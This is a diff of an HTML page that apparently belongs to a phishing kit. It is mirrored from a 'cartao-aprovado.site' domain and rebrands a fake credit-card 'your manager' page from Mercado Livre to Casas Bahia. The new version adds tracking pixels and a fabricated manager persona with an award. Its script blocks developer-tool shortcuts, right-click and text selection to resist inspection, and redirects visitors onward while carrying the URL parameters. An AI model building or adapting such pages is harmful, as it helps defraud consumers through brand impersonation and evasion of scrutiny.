@@ -1,12 +1,15 @@
-<html lang="pt-BR"><head></head>
-  <body style="user-select: none;">
-    ﻿
-
-    <!-- Mirrored from cartao-aprovado.site/card/recebimento/cep/confirma/maneger/index.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Jan 2025 18:39:37 GMT -->
-
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script async="" src="js/fbevents.js"></script>
+    <script async="" defer="" src="js/pixel_1.js"></script>
+    <script async="" defer="" src="js/pixel_2.js"></script>
+    <script async="" defer="" src="js/pixel_2_1.js"></script>
+    <script async="" defer="" src="js/pixel_2.js"></script>
+    <script async="" defer="" src="js/pixel.js"></script>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cartão Mercado Livre - Sua Gerente</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, max-scale=1.0">
+    <title>Sua Gerente - Cartão Casas Bahia</title>
 
     <style>
       @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap");
@@ -19,37 +22,52 @@
       }
 
       body {
-        background-color: #f6f6f6;
+        background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 50%, #f1f5f9 100%);
         color: #1f2937;
         line-height: 1.6;
+        margin: 0;
+        padding: 0;
+        min-height: 100vh;
+        overflow-x: hidden;
       }
 
-      .header {
-        background: linear-gradient(147deg, #003675 0%, #0d64fb 74%);
-        color: #333;
-        padding: 15px 0;
-        text-align: center;
-        font-size: 1.5rem;
-        font-weight: bold;
-        margin-top: -30px;
+      .iframe-container {
+        width: 100%;
+        max-width: 380px;
+        margin: 0 auto;
+        padding: 10px;
+        box-sizing: border-box;
+        min-height: auto;
       }
 
       .main-content {
-        max-width: 480px;
-        background-color: #ffffff;
-        padding: 2rem;
+        width: 100%;
+        background: linear-gradient(145deg, #ffffff 0%, #fafbfc 100%);
+        padding: 15px;
         border-radius: 12px;
-        margin: 40px auto;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-        border: 1px solid #f0f0f0;
+        box-shadow: 
+          0 6px 24px rgba(0, 0, 0, 0.05),
+          0 2px 6px rgba(0, 0, 0, 0.03),
+          inset 0 1px 0 rgba(255, 255, 255, 0.7);
+        border: 1px solid rgba(226, 232, 240, 0.6);
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+        box-sizing: border-box;
+      }
+
+      .main-content:hover {
+        transform: translateY(-1px);
+        box-shadow: 
+          0 10px 32px rgba(0, 0, 0, 0.08),
+          0 3px 8px rgba(0, 0, 0, 0.06);
       }
 
       .welcome-title {
-        font-size: 1.5rem;
+        font-size: 18px;
         font-weight: 600;
         color: #1f2937;
-        margin-bottom: 0.5rem;
+        margin-bottom: 8px;
         text-align: center;
+        letter-spacing: -0.025em;
       }
 
       .welcome-title span {
@@ -57,132 +75,294 @@
       }
 
       .subtitle {
-        color: #6b7280;
-        margin-bottom: 2rem;
+        color: #64748b;
+        margin-bottom: 15px;
         text-align: center;
-        font-size: 1rem;
+        font-size: 13px;
+        font-weight: 500;
       }
 
       .manager-card {
-        background: #fff5f3;
-        border: 1px solid rgba(238, 77, 45, 0.1);
+        background: linear-gradient(135deg, rgba(13, 100, 251, 0.02) 0%, rgba(59, 130, 246, 0.05) 100%);
+        border: 1px solid rgba(13, 100, 251, 0.1);
         border-radius: 12px;
-        padding: 2rem;
-        margin-bottom: 2rem;
+        padding: 20px;
+        margin-bottom: 15px;
         text-align: center;
+        position: relative;
+        overflow: hidden;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      }
+
+      .manager-card::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        right: -50%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%);
+        transform: skewX(-25deg);
+        transition: right 0.6s ease;
+      }
+
+      .manager-card:hover::before {
+        right: 150%;
+      }
+
+      .manager-card:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(13, 100, 251, 0.15);
       }
 
       .manager-photo {
-        width: 120px;
-        height: 120px;
-        border-radius: 60px;
-        margin-bottom: 1rem;
+        width: 90px;
+        height: 90px;
+        border-radius: 50%;
+        margin: 0 auto 12px;
         border: 3px solid #0d64fb;
-        padding: 3px;
+        padding: 2px;
+        display: block;
+        transition: transform 0.3s ease;
+        box-shadow: 0 4px 15px rgba(13, 100, 251, 0.2);
+      }
+
+      .manager-photo:hover {
+        transform: scale(1.05);
       }
 
       .manager-role {
-        color: #6b7280;
-        font-size: 0.875rem;
-        margin-bottom: 0.5rem;
+        color: #64748b;
+        font-size: 11px;
+        margin-bottom: 4px;
+        text-transform: uppercase;
+        font-weight: 500;
+        letter-spacing: 0.5px;
       }
 
       .manager-name {
         color: #0d64fb;
-        font-size: 1.25rem;
+        font-size: 16px;
         font-weight: 600;
-        margin-bottom: 0.5rem;
+        margin-bottom: 8px;
+        letter-spacing: -0.025em;
       }
 
       .manager-award {
         background: white;
         color: #4b5563;
-        padding: 0.5rem 1rem;
+        padding: 6px 12px;
         border-radius: 50px;
-        font-size: 0.875rem;
+        font-size: 11px;
         display: inline-block;
-        margin-top: 0.5rem;
+        margin-top: 4px;
+        font-weight: 500;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        border: 1px solid rgba(13, 100, 251, 0.1);
       }
 
       .contact-info {
         text-align: center;
         color: #4b5563;
-        margin: 1.5rem 0;
-        font-size: 0.9375rem;
-        line-height: 1.6;
-      }
-
-      .form-label {
-        color: #6b7280;
-        font-size: 0.875rem;
-        margin-bottom: 0.5rem;
-        display: block;
-      }
-
-      .form-control {
-        width: 100%;
-        padding: 0.875rem 1.25rem;
-        border: 1px solid #e5e7eb;
-        border-radius: 50px;
-        font-size: 1rem;
-        color: #1f2937;
-        transition: all 0.2s ease;
-      }
-
-      .form-control:focus {
-        border-color: #0d64fb;
-        outline: none;
-        box-shadow: 0 0 0 2px rgba(238, 77, 45, 0.1);
+        margin: 12px 0;
+        font-size: 12px;
+        line-height: 1.5;
       }
 
       .btn-custom {
-        background: linear-gradient(135deg, #0d64fb 0%, #0d64fb 100%);
-        color: rgb(255, 255, 255);
+        background: linear-gradient(135deg, #0d64fb 0%, #1e40af 100%);
+        color: white;
         border: none;
         width: 100%;
-        padding: 1rem 2rem;
+        padding: 12px 20px;
         border-radius: 50px;
-        font-size: 1rem;
-        font-weight: 500;
+        font-size: 14px;
+        font-weight: 600;
         cursor: pointer;
-        transition: all 0.3s ease;
-        margin-top: 1.5rem;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        margin-top: 12px;
+        box-shadow: 
+          0 4px 15px rgba(13, 100, 251, 0.3),
+          inset 0 1px 0 rgba(255, 255, 255, 0.2);
+        letter-spacing: 0.025em;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .btn-custom::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+        transition: left 0.5s ease;
+      }
+
+      .btn-custom:hover::before {
+        left: 100%;
       }
 
       .btn-custom:hover {
+        background: linear-gradient(135deg, #1e40af 0%, #3730a3 100%);
         transform: translateY(-2px);
-        box-shadow: 0 4px 12px rgba(238, 77, 45, 0.2);
+        box-shadow: 
+          0 8px 25px rgba(13, 100, 251, 0.4),
+          inset 0 1px 0 rgba(255, 255, 255, 0.3);
       }
 
-      .footer {
-        background-color: #1a1a1a;
-        color: #f5f5f5;
-        text-align: center;
-        padding: 2rem 1rem;
-        border-bottom: solid 3px #ffc600;
-        font-size: 0.875rem;
-      }
+      /* Responsividade para iframe mobile */
+      @media (max-width: 480px) {
+        .iframe-container {
+          padding: 8px;
+          max-width: 350px;
+        }
 
-      @media (max-width: 768px) {
         .main-content {
-          margin: 1rem;
-          padding: 1.5rem;
+          padding: 12px;
         }
 
         .manager-card {
-          padding: 1.5rem;
+          padding: 15px;
+        }
+
+        .manager-photo {
+          width: 80px;
+          height: 80px;
+        }
+
+        .welcome-title {
+          font-size: 16px;
+        }
+
+        .manager-name {
+          font-size: 15px;
+        }
+
+        .btn-custom {
+          padding: 10px 16px;
+          font-size: 13px;
         }
       }
+
+      /* Melhorias de performance */
+      .manager-card,
+      .main-content,
+      .btn-custom,
+      .manager-photo {
+        will-change: transform;
+      }
+
+      /* Acessibilidade */
+      @media (prefers-reduced-motion: reduce) {
+        *,
+        *::before,
+        *::after {
+          animation-duration: 0.01ms !important;
+          animation-iteration-count: 1 !important;
+          transition-duration: 0.01ms !important;
+        }
+      }
+
+      .btn-custom:focus {
+        outline: 2px solid #0d64fb;
+        outline-offset: 2px;
+      }
+
+      /* Prevenção de seleção de texto */
+      body {
+        -webkit-touch-callout: none;
+        -webkit-user-select: none;
+        -khtml-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
     </style>
-      <div style="grid-area: content; padding: 0 1rem">
-        <div class="main-content">
-            <div class="manager-card">
-              <img src="images/gerente.jpg" class="manager-photo" alt="Foto da Gerente">
-              <p class="manager-role">Gerente</p>
-              <h4 class="manager-name">Juliana Benedito</h4>
-              <span class="manager-award">🏆 Melhor gerente 2023-2024</span>
-            </div>
+</head>
+<body style="user-select: none;">
+    
+    <!-- Header removido para iframe -->
+
+    <div class="iframe-container">
+      <div class="main-content">
+        <h1 class="welcome-title">Sua <span>Gerente</span></h1>
+        <p class="subtitle">
+          Especialista em cartões de crédito
+        </p>
+        
+        <div class="manager-card">
+          <img src="images/gerente.jpg" class="manager-photo" alt="Foto da Gerente">
+          <p class="manager-role">Gerente Especializada</p>
+          <h4 class="manager-name">Juliana Benedito</h4>
+          <span class="manager-award">🏆 Melhor gerente 2023-2024</span>
+          
+          <div class="contact-info">
+            Experiente em soluções financeiras e<br>
+            atendimento personalizado para seu perfil
+          </div>
         </div>
       </div>
+    </div>
 
-</body><!-- Mirrored from cartao-aprovado.site/card/recebimento/cep/confirma/maneger/index.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Jan 2025 18:39:37 GMT --></html>
+    <script>
+      function continuarProcess() {
+        const btn = event.target;
+        btn.style.transform = "scale(0.95)";
+        btn.innerHTML = '<i class="fas fa-check"></i> Confirmado!';
+        
+        setTimeout(() => {
+          btn.style.transform = "";
+          btn.innerHTML = 'Redirecionando...';
+          
+          // Redireciona após confirmação
+          setTimeout(() => {
+            window.location.href = `cartao.html${window.location.search}`;
+          }, 1000);
+        }, 500);
+      }
+
+      // Adiciona efeitos visuais
+      document.addEventListener("DOMContentLoaded", function () {
+        const managerCard = document.querySelector('.manager-card');
+        const managerPhoto = document.querySelector('.manager-photo');
+        
+        // Animação de entrada
+        setTimeout(() => {
+          managerCard.style.opacity = '1';
+          managerCard.style.transform = 'translateY(0)';
+        }, 100);
+        
+        // Efeito de hover na foto
+        managerPhoto.addEventListener('mouseenter', function() {
+          this.style.transform = 'scale(1.05) rotate(2deg)';
+        });
+        
+        managerPhoto.addEventListener('mouseleave', function() {
+          this.style.transform = 'scale(1) rotate(0deg)';
+        });
+      });
+
+      // Prevenção de teclas de desenvolvedor
+      document.addEventListener('keydown', function(e) {
+        if (e.keyCode === 123 || 
+           (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
+           (e.ctrlKey && e.keyCode === 85)) {
+          e.preventDefault();
+        }
+      });
+
+      // Prevenção de menu de contexto
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+      });
+
+      // Prevenção de seleção de texto
+      document.addEventListener('selectstart', function(e) {
+        e.preventDefault();
+      });
+    </script>
+
+</body>
+</html>
